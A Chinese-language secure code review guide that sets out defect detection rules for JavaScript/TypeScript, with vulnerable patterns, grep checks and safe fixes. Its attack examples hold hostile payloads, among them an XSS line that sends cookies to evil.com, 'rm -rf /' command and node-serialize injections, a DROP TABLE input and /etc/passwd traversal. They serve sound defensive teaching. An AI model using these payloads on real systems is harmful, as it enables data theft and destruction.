# JavaScript/TypeScript 缺陷检测规则

## 规则概览

支持检测 8 类常见缺陷,按严重度分级:

- 🔴 **Blocker**(阻断级): SQL注入、命令注入、XSS、原型污染
- 🟠 **Critical**(严重级): 不安全的反序列化、路径遍历
- 🟡 **Major**(重要级): Promise 未处理、类型错误、竞态条件
- 🟢 **Minor**(次要级): N+1查询、内存泄漏

---

## 🔴 Blocker - 阻断级

### 1. SQL 注入

**风险等级**: 🔴 Blocker (10分)

**描述**: 使用字符串拼接或模板字符串构造 SQL 语句,存在 SQL 注入风险。

**危险模式**:

```javascript
// 模式 1: 模板字符串拼接
const userId = req.query.id;
const query = `SELECT * FROM users WHERE id = ${userId}`;  // ❌
db.query(query);

// 模式 2: 字符串拼接
const name = req.body.name;
const sql = "SELECT * FROM users WHERE name = '" + name + "'";  // ❌
connection.query(sql);

// 模式 3: 动态表名/字段名
const orderBy = req.query.sort;
const query = `SELECT * FROM products ORDER BY ${orderBy}`;  // ❌

// 模式 4: TypeORM raw query
const result = await repository.query(
  `SELECT * FROM user WHERE name = '${name}'`  // ❌
);
```

**攻击示例**:

```javascript
// 输入: id = "1 OR 1=1"
// 执行: SELECT * FROM users WHERE id = 1 OR 1=1
// 结果: 返回所有用户

// 输入: name = "'; DROP TABLE users--"
// 执行: SELECT * FROM users WHERE name = ''; DROP TABLE users--'
// 结果: 删除表
```

**检测方法**:

Level 1 - 文本匹配:

```bash
git diff HEAD~3..HEAD | grep -E '\$\{.*\}.*SELECT|"\s*\+.*SELECT'
```

Level 2 - Serena MCP:

```
查询: "查找所有使用模板字符串或字符串拼接构造 SQL 的代码"
查询: "查找包含 query/execute 且参数包含变量拼接的代码"
```

**安全示例**:

```javascript
// ✅ 使用参数化查询 (mysql2)
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE id = ?',
  [userId]
);

// ✅ PostgreSQL (pg)
const result = await client.query(
  'SELECT * FROM users WHERE name = $1',
  [name]
);

// ✅ TypeORM 参数绑定
const users = await repository
  .createQueryBuilder('user')
  .where('user.name = :name', { name })
  .getMany();

// ✅ Prisma (自动防注入)
const user = await prisma.user.findUnique({
  where: { name }
});

// ✅ 动态 ORDER BY 白名单
const ALLOWED_SORT = new Set(['name', 'price', 'created_at']);
const orderBy = req.query.sort || 'id';
if (!ALLOWED_SORT.has(orderBy)) {
  throw new Error('Invalid sort field');
}
const query = `SELECT * FROM products ORDER BY ${orderBy}`;  // 白名单验证后安全
```

**修复建议**:

1. 使用参数化查询 (`?`, `$1`)
2. 使用 ORM (TypeORM, Prisma, Sequelize)
3. 动态字段使用白名单验证

**参考**: OWASP A03:2021 - Injection

---

### 2. 命令注入

**风险等级**: 🔴 Blocker (10分)

**描述**: 使用用户输入构造系统命令,存在命令注入风险。

**危险模式**:

```javascript
// 模式 1: child_process.exec 直接拼接
const { exec } = require('child_process');
const filename = req.query.file;
exec(`cat ${filename}`, (err, stdout) => {  // ❌
  console.log(stdout);
});

// 模式 2: shell: true
const { spawn } = require('child_process');
const cmd = req.body.command;
spawn(cmd, { shell: true });  // ❌

// 模式 3: eval 执行用户输入
const code = req.body.code;
eval(code);  // ❌ 代码注入

// 模式 4: Function 构造器
const fn = new Function(req.body.code);  // ❌
fn();
```

**攻击示例**:

```javascript
// 输入: filename = "test.txt; rm -rf /"
// 执行: cat test.txt; rm -rf /
// 结果: 删除系统文件

// 输入: code = "require('fs').unlinkSync('important.db')"
// 执行: eval 执行任意代码
// 结果: 删除文件
```

**检测方法**:

```bash
git diff HEAD~3..HEAD | grep -E '(exec|eval|Function)\s*\('
```

Serena MCP:

```
查询: "查找所有调用 exec, eval, new Function 的代码"
查询: "查找所有 spawn/execFile 且 shell: true 的代码"
```

**安全示例**:

```javascript
// ✅ 使用 execFile (不使用 shell)
const { execFile } = require('child_process');
const filename = req.query.file;
execFile('cat', [filename], (err, stdout) => {
  console.log(stdout);
});

// ✅ spawn 参数数组形式
const { spawn } = require('child_process');
const child = spawn('ls', ['-la', directory]);

// ✅ 使用安全的 Node.js API
const fs = require('fs/promises');
const content = await fs.readFile(filename, 'utf8');

// ✅ 白名单验证命令
const ALLOWED_COMMANDS = new Set(['ls', 'pwd', 'date']);
const command = req.query.cmd;
if (!ALLOWED_COMMANDS.has(command)) {
  throw new Error('Invalid command');
}

// ❌ 永远不要用 eval 处理用户输入
// 使用 JSON.parse 安全解析
const data = JSON.parse(req.body.data);  // 只能解析 JSON
```

**修复建议**:

1. 使用 `execFile` 或 `spawn` 参数数组形式
2. 禁止 `eval`/`new Function` 处理用户输入
3. 使用白名单验证命令
4. 使用安全的 Node.js API 替代系统命令

**参考**: OWASP A03:2021 - Injection

---

### 3. XSS (跨站脚本攻击)

**风险等级**: 🔴 Blocker (10分)

**描述**: 用户输入未转义直接输出到 HTML,存在 XSS 风险。

**危险模式**:

```javascript
// 模式 1: innerHTML 直接赋值
const username = req.query.name;
res.send(`<h1>Welcome ${username}</h1>`);  // ❌ 反射型 XSS

// 模式 2: dangerouslySetInnerHTML (React)
function Welcome({ name }) {
  return <div dangerouslySetInnerHTML={{ __html: name }} />;  // ❌
}

// 模式 3: document.write
const comment = req.body.comment;
document.write(`<p>${comment}</p>`);  // ❌

// 模式 4: Vue v-html
<template>
  <div v-html="userInput"></div>  <!-- ❌ -->
</template>

// 模式 5: 存储型 XSS
app.post('/comment', async (req, res) => {
  const comment = req.body.comment;
  await db.comments.insert({ text: comment });  // ❌ 未过滤存储
});
```

**攻击示例**:

```javascript
// 输入: name = "<script>alert(document.cookie)</script>"
// 输出: <h1>Welcome <script>alert(document.cookie)</script></h1>
// 结果: 窃取 Cookie

// 输入: comment = "<img src=x onerror='fetch(`http://evil.com?c=${document.cookie}`)'>"
// 结果: 发送 Cookie 到攻击者服务器
```

**检测方法**:

```bash
git diff HEAD~3..HEAD | grep -E '(innerHTML|dangerouslySetInnerHTML|v-html|document\.write)'
```

Serena MCP:

```
查询: "查找所有使用 innerHTML, dangerouslySetInnerHTML, v-html 的代码"
查询: "查找所有直接将用户输入嵌入 HTML 的代码"
```

**安全示例**:

```javascript
// ✅ 使用模板引擎自动转义 (EJS, Pug)
res.render('welcome', { username });  // EJS 自动转义 <%= %>

// ✅ React 自动转义
function Welcome({ name }) {
  return <h1>Welcome {name}</h1>;  // 自动转义
}

// ✅ 使用 DOMPurify 清理
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;

// ✅ Vue 默认转义
<template>
  <div>{{ userInput }}</div>  <!-- 自动转义 -->
</template>

// ✅ 存储前过滤
import validator from 'validator';
app.post('/comment', async (req, res) => {
  let comment = req.body.comment;
  comment = validator.escape(comment);  // 转义 HTML
  await db.comments.insert({ text: comment });
});

// ✅ 设置 CSP 响应头
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'");
  next();
});
```

**修复建议**:

1. 使用框架默认转义 (React `{}`, Vue `{{}}`, EJS `<%= %>`)
2. 必须使用 `innerHTML` 时用 DOMPurify 清理
3. 设置 CSP (Content Security Policy) 响应头
4. 使用 `validator.escape()` 转义特殊字符

**参考**: OWASP A03:2021 - Injection

---

### 4. 原型污染

**风险等级**: 🔴 Blocker (10分)

**描述**: 不安全的对象合并或属性赋值,可污染 Object.prototype。

**危险模式**:

```javascript
// 模式 1: 递归合并未检查 __proto__
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key]);  // ❌
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// 模式 2: 直接赋值用户输入的键
const key = req.body.key;
const value = req.body.value;
obj[key] = value;  // ❌ 如果 key = "__proto__"

// 模式 3: lodash merge/set (旧版本)
const _ = require('lodash');
_.merge({}, req.body);  // ❌ lodash < 4.17.11

// 模式 4: 动态属性访问
const path = req.query.path.split('.');
let current = config;
for (let key of path) {
  current = current[key];  // ❌ 可访问 __proto__
}
```

**攻击示例**:

```javascript
// 攻击载荷
const payload = JSON.parse('{"__proto__":{"isAdmin":true}}');
merge({}, payload);

// 结果: 所有对象都有 isAdmin 属性
const user = {};
console.log(user.isAdmin);  // true (原型被污染)

// 权限绕过
if (user.isAdmin) {
  // 攻击者获得管理员权限
}
```

**检测方法**:

```bash
git diff HEAD~3..HEAD | grep -E '(Object\.assign|\[.*\]\s*=|\.merge\()'
```

Serena MCP:

```
查询: "查找所有递归合并对象但未检查 __proto__ 的代码"
查询: "查找所有动态属性赋值的代码"
```

**安全示例**:

```javascript
// ✅ 检查危险键
function safeMerge(target, source) {
  const DANGEROUS_KEYS = ['__proto__', 'constructor', 'prototype'];
  for (let key in source) {
    if (DANGEROUS_KEYS.includes(key)) {
      continue;  // 跳过危险键
    }
    if (typeof source[key] === 'object') {
      target[key] = safeMerge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// ✅ 使用 Object.create(null)
const config = Object.create(null);  // 无原型
config[req.body.key] = req.body.value;  // 安全

// ✅ 使用 Map
const config = new Map();
config.set(req.body.key, req.body.value);  // 完全安全

// ✅ 升级 lodash
const _ = require('lodash');  // >= 4.17.11
_.merge({}, req.body);  // 已修复

// ✅ 使用 Object.hasOwn (Node 16.9+)
const key = req.body.key;
if (Object.hasOwn(obj, key)) {  // 不检查原型链
  const value = obj[key];
}

// ✅ 冻结原型
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
```

**修复建议**:

1. 检查并拒绝 `__proto__`, `constructor`, `prototype` 键
2. 使用 `Object.create(null)` 或 `Map` 存储用户数据
3. 升级依赖库 (lodash >= 4.17.11)
4. 使用 `Object.hasOwn` 而非 `in` 或 `hasOwnProperty`

**参考**: CWE-1321: Improperly Controlled Modification of Object Prototype Attributes

---

## 🟠 Critical - 严重级

### 5. 不安全的反序列化

**风险等级**: 🟠 Critical (5分)

**描述**: 使用不安全的库反序列化不可信数据。

**危险模式**:

```javascript
// 模式 1: node-serialize
const serialize = require('node-serialize');
const obj = serialize.unserialize(req.body.data);  // ❌ 可执行代码

// 模式 2: eval JSON
const data = req.body.data;
const obj = eval(`(${data})`);  // ❌ 代码注入

// 模式 3: Function 构造
const code = `return ${req.body.json}`;
const obj = new Function(code)();  // ❌

// 模式 4: vm.runInNewContext 不可信代码
const vm = require('vm');
const result = vm.runInNewContext(req.body.code);  // ❌ 沙箱逃逸
```

**攻击示例**:

```javascript
// node-serialize 攻击载荷
const payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'rm -rf /\');}()"}';

// 受害者反序列化时执行命令
const obj = serialize.unserialize(payload);  // 执行 rm -rf /
```

**检测方法**:

```bash
git diff HEAD~3..HEAD | grep -E '(unserialize|eval|vm\.runInNewContext)'
```

Serena MCP:

```
查询: "查找所有调用 node-serialize, eval, vm.runInNewContext 的代码"
```

**安全示例**:

```javascript
// ✅ 使用 JSON.parse (安全但功能有限)
try {
  const obj = JSON.parse(req.body.data);
} catch (e) {
  throw new Error('Invalid JSON');
}

// ✅ 使用 JSON Schema 验证
const Ajv = require('ajv');
const ajv = new Ajv();

const schema = {
  type: 'object',
  properties: {
    name: { type: 'string' },
    age: { type: 'number' }
  },
  required: ['name']
};

const validate = ajv.compile(schema);
const data = JSON.parse(req.body.data);
if (!validate(data)) {
  throw new Error('Invalid data format');
}

// ✅ 使用安全的序列化库
const msgpack = require('msgpack-lite');
const data = msgpack.decode(buffer);  // 不执行代码

// ✅ TypeScript 类型验证
import { z } from 'zod';

const UserSchema = z.object({
  name: z.string(),
  age: z.number()
});

const data = JSON.parse(req.body.data);
const user = UserSchema.parse(data);  // 类型验证
```

**修复建议**:

1. 使用 `JSON.parse` 而非 `eval` 或 `unserialize`
2. 使用 JSON Schema 或 Zod 验证数据结构
3. 避免使用 `node-serialize`, `vm.runInNewContext`

**参考**: OWASP A08:2021 - Software and Data Integrity Failures

---

### 6. 路径遍历

**风险等级**: 🟠 Critical (5分)

**描述**: 用户输入未验证直接用于文件路径,可访问任意文件。

**危险模式**:

```javascript
// 模式 1: 直接拼接路径
app.get('/download', (req, res) => {
  const filename = req.query.file;
  const filepath = path.join(__dirname, 'uploads', filename);  // ❌
  res.sendFile(filepath);
});

// 模式 2: fs.readFile 未验证
const filename = req.query.file;
const content = fs.readFileSync(`./files/${filename}`);  // ❌

// 模式 3: Express static 配置不当
app.use('/files', express.static('/var/sensitive'));  // ❌ 暴露敏感目录
```

**攻击示例**:

```javascript
// 输入: file = "../../etc/passwd"
// 路径: /app/uploads/../../etc/passwd
// 解析: /etc/passwd
// 结果: 读取系统密码文件

// 输入: file = "../../app/config.json"
// 结果: 读取配置文件(可能包含数据库密码)
```

**检测方法**:

```bash
git diff HEAD~3..HEAD | grep -E '(sendFile|readFile|createReadStream).*req\.(query|body)'
```

Serena MCP:

```
查询: "查找所有使用用户输入构造文件路径的代码"
```

**安全示例**:

```javascript
// ✅ 验证文件名 (无路径分隔符)
const path = require('path');
app.get('/download', (req, res) => {
  const filename = req.query.file;

  // 检查文件名是否包含路径分隔符
  if (filename.includes('/') || filename.includes('\\') || filename.includes('..')) {
    return res.status(400).send('Invalid filename');
  }

  const filepath = path.join(__dirname, 'uploads', filename);
  res.sendFile(filepath);
});

// ✅ 使用白名单
const ALLOWED_FILES = new Set(['report.pdf', 'invoice.xlsx']);
const filename = req.query.file;
if (!ALLOWED_FILES.has(filename)) {
  return res.status(403).send('File not allowed');
}

// ✅ 规范化路径并检查
const requestedPath = path.resolve(__dirname, 'uploads', req.query.file);
const uploadsDir = path.resolve(__dirname, 'uploads');
if (!requestedPath.startsWith(uploadsDir)) {
  return res.status(403).send('Access denied');
}
res.sendFile(requestedPath);

// ✅ 使用数据库映射
const fileId = req.query.id;
const file = await db.files.findOne({ id: fileId });
if (!file) {
  return res.status(404).send('File not found');
}
res.sendFile(file.path);  // 从数据库获取真实路径
```

**修复建议**:

1. 验证文件名不包含 `/`, `\`, `..`
2. 使用白名单允许的文件
3. 规范化路径并检查是否在允许的目录内
4. 使用数据库 ID 映射文件路径,避免直接暴露路径

**参考**: OWASP A01:2021 - Broken Access Control

---

## 🟡 Major - 重要级

### 7. Promise 未处理的拒绝

**风险等级**: 🟡 Major (2分)

**描述**: async/await 或 Promise 未正确处理错误。

**危险模式**:

```javascript
// 模式 1: async 函数未 try-catch
app.post('/order', async (req, res) => {
  const order = await createOrder(req.body);  // ❌ 未处理错误
  res.json(order);
});

// 模式 2: Promise 未 .catch()
fetchData()
  .then(data => processData(data))  // ❌ 未处理拒绝
  .then(result => saveResult(result));

// 模式 3: 忘记 await
async function process() {
  saveToDatabase(data);  // ❌ 忘记 await
  return 'done';
}

// 模式 4: 并行 Promise 未捕获
Promise.all([
  fetchUser(),
  fetchOrders(),
  fetchProducts()
]);  // ❌ 未 .catch()
```

**检测方法**:

```bash
git diff HEAD~3..HEAD | grep -E 'async.*\{' -A10 | grep -v 'try\|catch'
```

Serena MCP:

```
查询: "查找所有 async 函数但未使用 try-catch 的代码"
查询: "查找所有 Promise 但未调用 .catch() 的代码"
```

**安全示例**:

```javascript
// ✅ async/await + try-catch
app.post('/order', async (req, res, next) => {
  try {
    const order = await createOrder(req.body);
    res.json(order);
  } catch (error) {
    next(error);  // 传递给错误处理中间件
  }
});

// ✅ Promise .catch()
fetchData()
  .then(data => processData(data))
  .then(result => saveResult(result))
  .catch(error => {
    logger.error('Processing failed', error);
    throw error;
  });

// ✅ 使用全局错误处理
app.use((err, req, res, next) => {
  logger.error(err);
  res.status(500).json({ error: 'Internal server error' });
});

// ✅ Promise.all 错误处理
try {
  const [user, orders, products] = await Promise.all([
    fetchUser(),
    fetchOrders(),
    fetchProducts()
  ]);
} catch (error) {
  logger.error('Fetch failed', error);
  throw error;
}

// ✅ 使用 process.on 全局捕获
process.on('unhandledRejection', (reason, promise) => {
  logger.error('Unhandled Rejection:', reason);
  // 优雅关闭
  process.exit(1);
});
```

**修复建议**:

1. async 函数使用 `try-catch`
2. Promise 链添加 `.catch()`
3. Express 使用错误处理中间件
4. 设置 `process.on('unhandledRejection')` 全局处理

---

### 8. 类型错误 (TypeScript)

**风险等级**: 🟡 Major (2分)

**描述**: TypeScript 类型注解缺失或使用 `any`,失去类型保护。

**危险模式**:

```typescript
// 模式 1: any 滥用
function processData(data: any): any {  // ❌
  return data.process();
}

// 模式 2: 缺少类型注解
function calculateTotal(items) {  // ❌
  return items.reduce((sum, item) => sum + item.price, 0);
}

// 模式 3: @ts-ignore 滥用
// @ts-ignore  ❌
const result = user.getName();

// 模式 4: 类型断言不安全
const user = data as User;  // ❌ 未验证
user.email.toLowerCase();
```

**检测方法**:

```bash
# 使用 tsc 静态类型检查
npx tsc --strict --noEmit
```

Serena MCP:

```
查询: "查找所有使用 any 类型的代码"
查询: "查找所有函数定义但缺少类型注解的代码"
```

**安全示例**:

```typescript
// ✅ 完整类型注解
interface Item {
  name: string;
  price: number;
}

function calculateTotal(items: Item[]): number {
  return items.reduce((sum, item) => sum + item.price, 0);
}

// ✅ 泛型约束
function processData<T extends { process(): void }>(data: T): void {
  data.process();
}

// ✅ 类型守卫
function isUser(data: unknown): data is User {
  return (
    typeof data === 'object' &&
    data !== null &&
    'email' in data &&
    typeof (data as User).email === 'string'
  );
}

if (isUser(data)) {
  console.log(data.email.toLowerCase());  // 安全
}

// ✅ Zod 运行时验证
import { z } from 'zod';

const UserSchema = z.object({
  email: z.string().email(),
  age: z.number().min(0)
});

type User = z.infer<typeof UserSchema>;

const user = UserSchema.parse(data);  // 运行时验证
```

**修复建议**:

1. 启用 TypeScript `strict` 模式
2. 避免使用 `any`,使用 `unknown` + 类型守卫
3. 使用 Zod/io-ts 运行时验证
4. 禁止 `@ts-ignore`,使用 `@ts-expect-error` + 注释

---

### 9. 竞态条件

**风险等级**: 🟡 Major (2分)

**描述**: 异步操作的并发问题,导致数据不一致。

**危险模式**:

```javascript
// 模式 1: 检查后使用 (TOCTOU)
if (await fs.access(filename)) {  // 检查
  const content = await fs.readFile(filename);  // 使用 ❌ 中间可能被删除
}

// 模式 2: 共享状态无锁保护
let counter = 0;
app.get('/increment', async (req, res) => {
  counter++;  // ❌ 非原子操作
  res.json({ counter });
});

// 模式 3: 数据库读-改-写未加锁
const user = await User.findOne({ id: userId });
user.balance -= amount;  // ❌ 并发时余额错误
await user.save();

// 模式 4: 并行修改同一资源
await Promise.all([
  updateInventory(productId, -1),
  updateInventory(productId, -1)  // ❌ 竞态条件
]);
```

**检测方法**:

Serena MCP:

```
查询: "查找所有读-改-写模式但未加锁的代码"
查询: "查找所有并发操作同一资源的代码"
```

**安全示例**:

```javascript
// ✅ 直接操作,避免检查后使用
try {
  const content = await fs.readFile(filename);
} catch (err) {
  if (err.code === 'ENOENT') {
    // 文件不存在
  }
}

// ✅ 使用原子操作
const Redis = require('ioredis');
const redis = new Redis();
await redis.incr('counter');  // 原子自增

// ✅ 数据库乐观锁
const user = await User.findOne({ id: userId });
user.balance -= amount;
user.version++;  // 版本号
await user.save();  // WHERE version = oldVersion

// ✅ 数据库事务
await db.transaction(async (trx) => {
  const user = await User.query(trx).findById(userId).forUpdate();  // 悲观锁
  user.balance -= amount;
  await user.save();
});

// ✅ 使用队列串行化
const queue = new PQueue({ concurrency: 1 });
await queue.add(() => updateInventory(productId, -1));
await queue.add(() => updateInventory(productId, -1));
```

**修复建议**:

1. 避免"检查后使用"模式,直接操作 + 异常处理
2. 使用原子操作 (Redis INCR, SQL UPDATE ... SET x = x + 1)
3. 使用数据库事务 + 乐观/悲观锁
4. 使用队列串行化关键操作

---

## 🟢 Minor - 次要级

### 10. N+1 查询问题

**风险等级**: 🟢 Minor (1分)

**描述**: 循环中执行数据库查询,导致性能问题。

**危险模式**:

```javascript
// 模式 1: 循环查询
const orders = await Order.find();
for (const order of orders) {
  const user = await User.findById(order.userId);  // ❌ N+1
  order.userName = user.name;
}

// 模式 2: TypeORM 懒加载
@Entity()
class Order {
  @ManyToOne(() => User)
  user: User;
}

const orders = await orderRepo.find();
for (const order of orders) {
  console.log(order.user.name);  // ❌ 触发 N 次查询
}

// 模式 3: Mongoose populate 缺失
const orders = await Order.find();  // 未 populate
for (const order of orders) {
  console.log(order.user.name);  // ❌ undefined 或触发额外查询
}
```

**检测方法**:

```bash
git diff HEAD~3..HEAD | grep -E 'for.*of' -A5 | grep -E '\.find|\.findById'
```

Serena MCP:

```
查询: "查找所有在循环内调用数据库查询方法的代码"
```

**安全示例**:

```javascript
// ✅ TypeORM relations
const orders = await orderRepo.find({
  relations: ['user']
});
for (const order of orders) {
  console.log(order.user.name);  // 无额外查询
}

// ✅ Mongoose populate
const orders = await Order.find().populate('user');
for (const order of orders) {
  console.log(order.user.name);
}

// ✅ Prisma include
const orders = await prisma.order.findMany({
  include: { user: true }
});

// ✅ 手动批量查询
const orders = await Order.find();
const userIds = orders.map(o => o.userId);
const users = await User.find({ _id: { $in: userIds } });
const userMap = new Map(users.map(u => [u._id.toString(), u]));

orders.forEach(order => {
  order.userName = userMap.get(order.userId.toString()).name;
});

// ✅ DataLoader (GraphQL)
const userLoader = new DataLoader(async (userIds) => {
  const users = await User.find({ _id: { $in: userIds } });
  return userIds.map(id => users.find(u => u._id.equals(id)));
});

for (const order of orders) {
  const user = await userLoader.load(order.userId);  // 批量加载
}
```

**修复建议**:

1. 使用 ORM 的 `relations`/`include`/`populate`
2. 手动批量查询 + Map 缓存
3. 使用 DataLoader 批量加载 (GraphQL)

---

## 功能缺陷检测

与 Java/Python 相同,需要验证需求实现情况:

### 功能完全缺失 (CRITICAL)

需求明确要求的功能在代码中完全找不到。

**示例**:

需求: "用户注册成功后,发送验证邮件"

```javascript
// ❌ 缺失发送邮件功能
app.post('/register', async (req, res) => {
  const user = await User.create(req.body);
  res.json({ message: 'Registration successful' });
});
```

### 功能实现不完整 (HIGH)

功能部分实现,但缺少关键逻辑分支或边界条件处理。

**示例**:

需求: "支持邮箱和手机号两种登录方式"

```javascript
// ❌ 只实现了邮箱登录
async function login(credential, password) {
  if (credential.includes('@')) {
    return await loginByEmail(credential, password);
  }
  // 缺少手机号登录分支
  throw new Error('Unsupported login method');
}
```

### 业务逻辑错误 (CRITICAL)

代码实现与需求描述的业务流程矛盾。

**示例**:

需求: "支付流程: 1.验证余额 2.扣减余额 3.创建订单"

```javascript
// ❌ 流程顺序错误
async function createOrder(userId, items) {
  await deductBalance(userId, total);  // 先扣款
  const balance = await getBalance(userId);
  if (balance < total) {  // 后验证
    throw new Error('Insufficient balance');
  }
  return await Order.create({ userId, items });
}
```

---

## 检测优先级汇总

| 缺陷类型 | 严重程度 | 分数 | 影响 | 检测关键词 |
|---------|---------|------|------|-----------|
| SQL 注入 | 🔴 Blocker | 10 | 数据泄露 | Template string + SQL |
| 命令注入 | 🔴 Blocker | 10 | 系统破坏 | exec, eval, shell: true |
| XSS | 🔴 Blocker | 10 | 会话劫持 | innerHTML, dangerouslySetInnerHTML |
| 原型污染 | 🔴 Blocker | 10 | 权限绕过 | __proto__, merge |
| 不安全反序列化 | 🟠 Critical | 5 | 代码执行 | unserialize, eval |
| 路径遍历 | 🟠 Critical | 5 | 文件泄露 | sendFile + user input |
| Promise 未处理 | 🟡 Major | 2 | 隐藏错误 | async without try-catch |
| 类型错误 | 🟡 Major | 2 | 运行时崩溃 | any, missing types |
| 竞态条件 | 🟡 Major | 2 | 数据不一致 | Read-modify-write |
| N+1 查询 | 🟢 Minor | 1 | 性能下降 | Loop + query |

**风险分数计算**: `Blocker×10 + Critical×5 + Major×2 + Minor×1`

---

## 参考资源

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [ESLint Security Plugin](https://github.com/nodesecurity/eslint-plugin-security)
- [TypeScript Handbook](https://www.typescriptlang.org/docs/handbook/intro.html)
- [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit)

---

**版本**: 1.0.0
**创建**: 2025-11-08
